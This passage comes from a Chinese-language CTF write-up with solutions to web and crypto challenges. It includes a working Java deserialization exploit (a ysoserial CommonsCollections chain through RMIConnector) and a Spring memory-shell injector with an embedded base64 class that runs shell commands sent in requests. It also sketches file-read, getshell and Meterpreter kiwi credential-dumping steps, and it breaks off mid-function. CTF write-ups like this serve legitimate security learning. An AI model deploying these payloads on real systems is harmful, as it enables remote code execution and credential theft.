    check_c=convert_emoji_to_number(checkstr)
    <span class="hljs-comment">#print(v40,convert_number_to_emoji(v40))</span>
    <span class="hljs-comment">#print(check_c)</span>
    <span class="hljs-comment">#print(gmpy2.jacobi(check_c,n))</span>
    <span class="hljs-keyword">return</span> gmpy2.jacobi(check_c,n)

up=<span class="hljs-number">13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084095</span>
down=<span class="hljs-number">13</span>

<span class="hljs-keyword">while</span> up-down&gt;<span class="hljs-number">1</span>:
    newp=up-((up-down)//<span class="hljs-number">2</span>)
    <span class="hljs-built_in">print</span>(newp)
    <span class="hljs-keyword">if</span> put_up(newp)==<span class="hljs-number">1</span>:
        up=newp
    <span class="hljs-keyword">else</span>:
        down=newp

<span class="hljs-built_in">print</span>(up)
<span class="hljs-built_in">print</span>(down)


<span class="hljs-comment"># get v40 and reset</span>
<span class="hljs-string">&#x27;&#x27;&#x27;
io.recvuntil(&quot;&gt; &quot;)
io.writeline(&quot;3&quot;)
oo=str(io.readline().strip(),encoding=&quot;utf8&quot;)
v40=convert_emoji_to_number(oo)
print(&quot;v40:&quot;,v40)
print(&quot;##&quot;)&#x27;&#x27;&#x27;</span>

<span class="hljs-comment"># get flag</span>
io.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)
io.writeline(<span class="hljs-string">&quot;4&quot;</span>)
io.recvuntil(<span class="hljs-string">&quot;🔑: &quot;</span>)
io.writeline(convert_number_to_emoji(up))
io.interactive()</code></pre><h2 id="web"><a class="header-link" href="#web"></a>WEB</h2>
<h3 id="buggyloader"><a class="header-link" href="#buggyloader"></a>buggyLoader</h3>
<p>题目需要结合二次反序列化get flag，同时序列化的数据需要满足<code>IndexController</code>类中的限制：</p>
<pre class="hljs"><code><span class="hljs-built_in">String</span> name = objectInputStream.readUTF();
int year = objectInputStream.readInt();
<span class="hljs-keyword">if</span> (name.equals(<span class="hljs-string">&quot;0CTF/TCTF&quot;</span>) &amp;&amp; year == <span class="hljs-number">2021</span>) {
    objectInputStream.readObject();
}</code></pre><p>这里通过<code>writeUTF</code>和<code>writeInt</code>先分别写入<code>0CTF/TCTF</code>和<code>2021</code>，然后再<code>writeObject</code>：</p>
<pre class="hljs"><code>ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
ObjectOutputStream oss = <span class="hljs-literal">null</span>;
oss = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);
oss.writeUTF(<span class="hljs-string">&quot;0CTF/TCTF&quot;</span>);
oss.writeInt(<span class="hljs-number">2021</span>);
oss.writeObject(obj);
oss.flush();
byte[] bytes = bos.toByteArray();
bos.close();

<span class="hljs-built_in">String</span> hex = Utils.bytesTohexString(bytes);</code></pre><p>序列化数据的构造：首先是<code>MyObjectInputStream</code>中<code>resolveClass</code>影响了链子的构造，最后是<code>cc4</code>的链调到<code>RMIConnector</code>的<code>connect</code>触发二次反序列化。
生成序列化数据：</p>
<pre class="hljs"><code>package com.yxxx.buggyLoader;

<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;
<span class="hljs-keyword">import</span> ysoserial.payloads.CommonsCollections4;
<span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;

<span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;
<span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;
<span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.Base64;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Map;

public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exp</span> </span>{

    public <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> main(<span class="hljs-built_in">String</span>[] args) throws Exception {
        <span class="hljs-built_in">Object</span> obj = getObject();
        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oss = <span class="hljs-literal">null</span>;
        oss = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);
        oss.writeUTF(<span class="hljs-string">&quot;0CTF/TCTF&quot;</span>);
        oss.writeInt(<span class="hljs-number">2021</span>);
        oss.writeObject(obj);
        oss.flush();
        byte[] bytes = bos.toByteArray();
        bos.close();

        <span class="hljs-built_in">String</span> hex = Utils.bytesTohexString(bytes);
        System.out.println(hex);

        byte[] b2 = Utils.hexStringToBytes(hex);
        InputStream inputStream1 = <span class="hljs-keyword">new</span> ByteArrayInputStream(b2);
        ObjectInputStream objectInputStream1 = <span class="hljs-keyword">new</span> MyObjectInputStream(inputStream1);
        <span class="hljs-built_in">Object</span> obj2 = objectInputStream1.readObject();
    }

    public <span class="hljs-keyword">static</span> Serializable getObject() throws Exception {
        Transformer transformer = InvokerTransformer.getInstance(<span class="hljs-string">&quot;connect&quot;</span>);
        CommonsCollections4 commonsCollections3 = <span class="hljs-keyword">new</span> CommonsCollections4();
        ByteArrayOutputStream outputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(outputStream);
        objectOutputStream.writeObject(commonsCollections3.getObject(<span class="hljs-string">&quot;touch /tmp/success&quot;</span>));
        <span class="hljs-built_in">String</span> expbase64 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(Base64.getEncoder().encode(outputStream.toByteArray()));
        <span class="hljs-built_in">String</span> finalExp = <span class="hljs-string">&quot;service:jmx:rmi:///stub/&quot;</span> + expbase64;
        RMIConnector rmiConnector = <span class="hljs-keyword">new</span> RMIConnector(<span class="hljs-keyword">new</span> JMXServiceURL(finalExp), <span class="hljs-keyword">new</span> HashMap&lt;&gt;());

        <span class="hljs-built_in">Map</span> innerMap = <span class="hljs-keyword">new</span> HashMap();
        <span class="hljs-built_in">Map</span> lazyMap = LazyMap.decorate(innerMap, transformer);
        TiedMapEntry entry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, rmiConnector);
        HashSet map = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);
        map.add(<span class="hljs-string">&quot;foo&quot;</span>);
        Field f = <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">try</span> {
            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);
        } <span class="hljs-keyword">catch</span> (NoSuchFieldException var18) {
            f = HashSet.class.getDeclaredField(<span class="hljs-string">&quot;backingMap&quot;</span>);
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);
        Field f2 = <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">try</span> {
            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);
        } <span class="hljs-keyword">catch</span> (NoSuchFieldException var17) {
            f2 = HashMap.class.getDeclaredField(<span class="hljs-string">&quot;elementData&quot;</span>);
        }

        Reflections.setAccessible(f2);
        <span class="hljs-built_in">Object</span>[] array = (<span class="hljs-built_in">Object</span>[]) ((<span class="hljs-built_in">Object</span>[]) f2.get(innimpl));
        <span class="hljs-built_in">Object</span> node = array[<span class="hljs-number">0</span>];
        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">null</span>) {
            node = array[<span class="hljs-number">1</span>];
        }

        Field keyField = <span class="hljs-literal">null</span>;

        <span class="hljs-keyword">try</span> {
            keyField = node.getClass().getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);
        } <span class="hljs-keyword">catch</span> (Exception var16) {
            keyField = Class.forName(<span class="hljs-string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);
        <span class="hljs-keyword">return</span> map;
    }

}</code></pre><p>但是服务不出网，无法反弹shell，需要写入内存马，通过ScriptManager来注入内存马：</p>
<pre class="hljs"><code>org.springframework.web.context.request.ServletRequestAttributes servletRequestAttributes = (org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes();
        javax.servlet.http.HttpServletRequest req = ((org.springframework.web.context.request.ServletRequestAttributes) servletRequestAttributes).getRequest();
        org.springframework.web.context.WebApplicationContext context = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(req.getServletContext());
        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="hljs-string">&quot;requestMappingHandlerMapping&quot;</span>);
        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);
        field.setAccessible(<span class="hljs-literal">true</span>);
        java.util.ArrayList adaptedInterceptors = (java.util.ArrayList)field.get(abstractHandlerMapping);
        java.lang.String className = <span class="hljs-string">&quot;com.example.memshell_spring_boot.evil.EvilInterceptor&quot;</span>;
        java.lang.String b64 = <span class="hljs-string">&quot;yv66vgAAADQAeQoAGgA8CAAyCwA9AD4IAD8KAEAAQQcAQggAQwgARAoAQABFCgBGAEcKAEYASAoARgBJBwBKCgANADwKAA0ASwgATAoADQBNCgBOAE8KAE4AUAoABgBRCgANAFIIAFMLAFQAVQoAVgBXBwBYBwBZAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADdMY29tL2V4YW1wbGUvbWVtc2hlbGxfc3ByaW5nX2Jvb3QvZXZpbC9FdmlsSW50ZXJjZXB0b3I7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAB3Byb2Nlc3MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3Rkb3V0AQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAGc3RkZXJyAQAKc3Rkb3V0QnVmZgEAAltCAQAKc3RkZXJyQnVmZgEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQADcmVzAQANU3RhY2tNYXBUYWJsZQcAQgEACkV4Y2VwdGlvbnMHAFoBABBNZXRob2RQYXJhbWV0ZXJzAQAKU291cmNlRmlsZQEAFEV2aWxJbnRlcmNlcHRvci5qYXZhDAAbABwHAFsMAFwAXQEAAAcAXgwAXwBgAQAQamF2YS9sYW5nL1N0cmluZwEACS9iaW4vYmFzaAEAAi1jDABhAGIHAGMMAGQAZQwAZgBnDABoAGcBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAaQBqAQAjLS0tLS0tLS0tLS0tLXN0ZG91dC0tLS0tLS0tLS0tLS0tLQoMAGsAbAcAbQwAbgBlDABvAHAMABsAcQwAaQByAQAjLS0tLS0tLS0tLS0tLXN0ZGVyci0tLS0tLS0tLS0tLS0tLQoHAHMMAHQAdQcAdgwAdwB4AQA1Y29tL2V4YW1wbGUvbWVtc2hlbGxfc3ByaW5nX2Jvb3QvZXZpbC9FdmlsSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAHd2FpdEZvcgEAAygpSQEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAA5nZXRFcnJvclN0cmVhbQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQAEcmVhZAEABShbQilJAQAFKFtCKVYBABwoQylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhABkAGgAAAAAAAgABABsAHAABAB0AAAAvAAEAAQAAAAUqtwABsQAAAAIAHgAAAAYAAQAAAAkAHwAAAAwAAQAAAAUAIAAhAAAAAQAiACMAAwAdAAAB6gAFAAsAAAEDKxICuQADAgA6BBIEOgUZBMYA8bgABQa9AAZZAxIHU1kEEghTWQUZBFO2AAk6BhkGtgAKVxkGtgALOgcZBrYADDoIuwANWbcADhkFtgAPEhC2AA+2ABE6BRkHtgASvAg6CRkHGQm2ABNXuwANWbcADhkFtgAPuwAGWRkJtwAUtgAPtgAROgW7AA1ZtwAOGQW2AA8QCrYAFbYAEToFuwANWbcADhkFtgAPEha2AA+2ABE6BRkItgASvAg6ChkIGQq2ABNXuwANWbcADhkFtgAPuwAGWRkKtwAUtgAPtgAROgW7AA1ZtwAOGQW2AA8QCrYAFbYAEToFLLkAFwEAGQW2ABgErAAAAAMAHgAAAE4AEwAAAAsACgAMAA4ADQATAA4ALgAPADQAEAA7ABEAQgASAFgAEwBhABQAaQAVAIYAFgCcABcAsgAYALsAGQDDABoA4AAbAPYAHAEBAB4AHwAAAHAACwAuANMAJAAlAAYAOwDGACYAJwAHAEIAvwAoACcACABhAKAAKQAqAAkAuwBGACsAKgAKAAABAwAgACEAAAAAAQMALAAtAAEAAAEDAC4ALwACAAABAwAwADEAAwAKAPkAMgAzAAQADgD1ADQAMwAFADUAAAALAAH9AQEHADYHADYANwAAAAQAAQA4ADkAAAANAwAsAAAALgAAADAAAAABADoAAAACADs=&quot;</span>;
        sun.misc.BASE64Decoder mydecoder = (sun.misc.BASE64Decoder)sun.misc.BASE64Decoder.class.newInstance();
        byte[] bytes = mydecoder.decodeBuffer(b64);
        java.lang.ClassLoader classLoader = java.lang.Thread.currentThread().getContextClassLoader();
        java.lang.System.out.println(<span class="hljs-string">&quot;flight&quot;</span>);
        java.lang.System.out.println(classLoader);
        java.lang.System.out.println(className);
        java.lang.System.out.println(bytes);
        java.lang.System.out.println(bytes.length);
        java.lang.reflect.Field field = Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);
        field.setAccessible(<span class="hljs-literal">true</span>);
        sun.misc.Unsafe unsafe = field.get(<span class="hljs-literal">null</span>);
        java.lang.Class cls = unsafe.defineClass(<span class="hljs-string">&quot;com.example.memshell_spring_boot.evil.EvilInterceptor&quot;</span>, bytes, <span class="hljs-number">0</span>, bytes.length, classLoader, java.lang.System.class.getProtectionDomain());
        java.lang.System.out.println(<span class="hljs-string">&quot;flight2&quot;</span>);
        java.lang.System.out.println(cls);
        adaptedInterceptors.add(cls.newInstance());</code></pre><h3 id="win-win"><a class="header-link" href="#win-win"></a>Win-Win</h3>
<pre class="hljs"><code>xampp路径加一层随机字符串
C:<span class="hljs-regexp">/this_is_a_secret_path_107b1177348cc063a0713838282b1c27892d5fe2/</span>php<span class="hljs-regexp">/tests/</span>parseDir/phpinfo.php
用通配符&lt;&lt;+所有windows下默认apache目录进行爆破
readfile(<span class="hljs-string">&quot;C:/t&lt;&lt;/php/tests/parseDir/phpinfo.php&quot;</span>);</code></pre><p>第二种办法</p>
<p>readfile \.\C:直接下载C盘，然后拖到磁盘分析工具里面看目录，文件太大可以不下全部</p>
<p>然后session_upload包含或者包含tmp文件getshell</p>
<p>然后得到shell以后传msf木马</p>
<pre class="hljs"><code><span class="hljs-keyword">load</span> kiwi


creds_all获取用户名密码</code></pre><p>代理上去登录远程桌面获取flag</p>
<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
<h3 id="babylogin"><a class="header-link" href="#babylogin"></a>babylogin</h3>
<p>题目给了个client来连接服务器。
文件是pyinstaller打包的，python去调了libsmartcard.so的函数，用来加密和哈希。</p>
<p>baba的密码只有4位，hash已知，可以本地爆破。</p>
<p>root需要用token登录，baba修改root的密码后自行算出他的token，然后再token登。client的-k参数可以保持连接。</p>
<pre class="hljs"><code>secure<span class="hljs-constructor">_decrypt(<span class="hljs-params">token</span>)</span><span class="hljs-operator"> == </span>secure<span class="hljs-constructor">_hash(<span class="hljs-params">passwordhash</span>)</span></code></pre><p>逆向libsmartcard.so得到secure_decrypt的逻辑</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> data

out_tab = np.array(data.out_tab).reshape((<span class="hljs-number">16</span>, <span class="hljs-number">256</span>))
table1 = np.array(data.table1).reshape((<span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">256</span>))
table2 = np.array(data.table2).reshape((<span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">256</span>))
swap_tab = np.array(data.swap_tab).reshape((<span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">96</span>, <span class="hljs-number">16</span>))


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arrange</span>(<span class="hljs-params">data</span>):</span>
    <span class="hljs-comment">#idx = [0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12, 1, 6, 11]</span>
    <span class="hljs-comment">#idx[i] == i * 5 % 16</span>
    vals = [data[i * <span class="hljs-number">5</span> % <span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]
    <span class="hljs-keyword">return</span> np.array(vals)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">split_byte</span>(<span class="hljs-params">x</span>):</span>
    vals = [x &gt;&gt; (<span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xFF</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
    vals = vals[::-<span class="hljs-number">1</span>]
    vals = [[x&amp;<span class="hljs-number">0xF</span>, x&gt;&gt;<span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> vals]
    <span class="hljs-keyword">return</span> vals


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sub_tab</span>(<span class="hljs-params">tab, data</span>):</span>
    vals = [split_byte(tab[i,data[i]]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]
    <span class="hljs-keyword">return</span> np.array(vals)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wtf</span>(<span class="hljs-params">sw, low, high</span>):</span>
    x1 = sw[low[<span class="hljs-number">0</span>]+<span class="hljs-number">32</span>][low[<span class="hljs-number">1</span>]] + <span class="hljs-number">80</span>
    y1 = sw[low[<span class="hljs-number">2</span>]+<span class="hljs-number">48</span>][low[<span class="hljs-number">3</span>]]
    v1 = sw[x1][y1]
    x2 = sw[high[<span class="hljs-number">0</span>]][high[<span class="hljs-number">1</span>]] + <span class="hljs-number">64</span>
    y2 = sw[high[<span class="hljs-number">2</span>]+<span class="hljs-number">16</span>][high[<span class="hljs-number">3</span>]]
    v2 = sw[x2][y2]
    <span class="hljs-keyword">return</span> v1 | (v2 &lt;&lt; <span class="hljs-number">4</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wtf2</span>(<span class="hljs-params">sw, vals</span>):</span>
    ans = np.zeros(<span class="hljs-number">4</span>, dtype=<span class="hljs-built_in">int</span>)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
        low, high = vals[:,i,<span class="hljs-number">0</span>], vals[:,i,<span class="hljs-number">1</span>]
        ans[i] = wtf(sw[i], low, high)
    <span class="hljs-keyword">return</span> ans


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">myhash</span>(<span class="hljs-params">data</span>):</span>

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):
        data = arrange(data)

        data = data.reshape((<span class="hljs-number">4</span>, <span class="hljs-number">4</span>))
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):
            vals = sub_tab(table1[i,j], data[j])
            data[j] = wtf2(swap_tab[i,j], vals)
            vals = sub_tab(table2[i,j], data[j])
            data[j] = wtf2(swap_tab[i,j], vals)
        data = data.reshape((<span class="hljs-number">16</span>,))

    data = arrange(data)
    data = [out_tab[i,data[i]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]
    <span class="hljs-keyword">return</span> data


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">secure_decrypt</span>(<span class="hljs-params">buf</span>):</span>
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1337</span>):
        buf = myhash(buf)
    <span class="hljs-keyword">return</span> buf</code></pre><p>反推的主要难点在于 swap_tab。
swap_tab 的规律：如果把 swap_tab 看成 <code>int[n][16]</code> 的数组，那么 <code>swap_tab[a][b] = (a^b) % 16</code>
这样就可以消除所有swap_tab的查询。然后用 meet-in-the-middle 反推。</p>
<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;data.h&quot;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdio&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unordered_map&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;algorithm&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> *buf)</span>
</span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i)
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02d &quot;</span>, buf[i]);
    <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> buf[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span>
</span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) {
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j)
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02d &quot;</span>, buf[i][j]);
        <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);
    }
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">arrange_inv</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> *buf)</span>
</span>{
    <span class="hljs-keyword">uint8_t</span> vals[<span class="hljs-number">16</span>];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i)
        vals[i] = buf[i * <span class="hljs-number">13</span> % <span class="hljs-number">16</span>];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i)
        buf[i] = vals[i];
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">reshape</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">uint8_t</span> *buf, <span class="hljs-keyword">uint8_t</span> buf2[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span>
</span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i) {
        <span class="hljs-keyword">int</span> x = i / <span class="hljs-number">4</span>, y = i % <span class="hljs-number">4</span>;
        buf2[x][y] = buf[i];
    }
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">reshape</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">uint8_t</span> buf[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>], <span class="hljs-keyword">uint8_t</span> *buf2)</span>
</span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i) {
        <span class="hljs-keyword">int</span> x = i / <span class="hljs-number">4</span>, y = i % <span class="hljs-number">4</span>;
        buf2[i] = buf[x][y];
    }
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sub_tab_inv</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">uint32_t</span> table[<span class="hljs-number">4</span>][<span class="hljs-number">256</span>], <span class="hljs-keyword">uint8_t</span> vals[<span class="hljs-number">4</span>])</span>
</span>{
    unordered_map&lt;<span class="hljs-keyword">uint32_t</span>, pair&lt;<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>&gt;&gt; s1, s2;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; ++i)
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">256</span>; ++j) {
            <span class="hljs-keyword">uint32_t</span> v = table[<span class="hljs-number">0</span>][i] ^ table[<span class="hljs-number">1</span>][j];
            s1[v] = <span class="hljs-built_in">make_pair</span>(i, j);
        }
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; ++i)
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">256</span>; ++j) {
            <span class="hljs-keyword">uint32_t</span> v = table[<span class="hljs-number">2</span>][i] ^ table[<span class="hljs-number">3</span>][j];
            s2[v] = <span class="hljs-built_in">make_pair</span>(i, j);
        }
    <span class="hljs-keyword">uint32_t</span> vdata = (vals[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) | (vals[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (vals[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | vals[<span class="hljs-number">3</span>];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;x : s1) {
        <span class="hljs-keyword">uint32_t</span> v1 = x.first;
        <span class="hljs-keyword">uint32_t</span> v2 = v1 ^ vdata;
        <span class="hljs-keyword">auto</span> y = s2.<span class="hljs-built_in">find</span>(v2);
        <span class="hljs-keyword">if</span> (y != s2.<span class="hljs-built_in">end</span>()) {
            <span class="hljs-keyword">auto</span> p1 = x.second;
            <span class="hljs-keyword">auto</span> p2 = y-&gt;second;
            vals[<span class="hljs-number">0</span>] = p1.first;
            vals[<span class="hljs-number">1</span>] = p1.second;
            vals[<span class="hljs-number">2</span>] = p2.first;
            vals[<span class="hljs-number">3</span>] = p2.second;
            <span class="hljs-keyword">return</span>;
        }
    }
    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;bad&quot;</span>);
}

<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hash_inv</span><span class="hljs-params">(<span class="hljs-keyword">uint8_t</span> *buf)</span>
</span>{
